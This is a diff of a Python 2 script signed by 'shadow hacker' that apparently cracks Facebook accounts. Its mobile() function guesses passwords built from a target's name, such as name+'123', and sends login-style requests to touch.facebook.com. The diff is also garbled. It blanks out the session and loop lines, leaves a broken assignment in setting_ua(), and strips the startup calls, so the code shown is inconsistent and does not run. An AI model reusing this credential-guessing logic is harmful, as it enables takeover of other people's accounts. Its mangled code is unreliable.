@@ -1,16 +1,16 @@
 # -*- coding: utf-8
-
 # author by shadow hacker
-
 import os
+try:
+ import requests
+except ImportError:
+os.system("pip2 install requests")
 
 try:
+   import bs4
+	
 
-	import requestsexcept ImportError:
 
-	os.system("pip2 install requests")
-
-try:
 
 	import bs4
 
@@ -738,15 +738,15 @@ def mobile(user):
 
 		pwx = [ name+"123", name+"12345" ]
 
-	try:
+	
 
-		for pw in pwx:
+		
 
-			kwargs = {}
+			
 
-			pw = pw.lower()
+			
 
-			ses = requests.Session()
+			
 
 			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 
@@ -920,13 +920,7 @@ def setting_ua():
 
 	elif ua == "1":
 
-		c_ua = raw_input(" [+] Enter User-Agent : ")
-
-		open(".ua", "w").write(c_ua)
-
-		time.sleep(1)
-
-		raw_input("\n [!] Press Enter To Save User-Agent")
+		c_ua =  [!] Press Enter To Save User-Agent")
 
 		menu()
 
@@ -956,8 +950,4 @@ if __name__ == "__main__":
 
 	os.system("git pull")
 
-	os.system("touch login.txt")
 
-	buat_folder()
-
-	login()
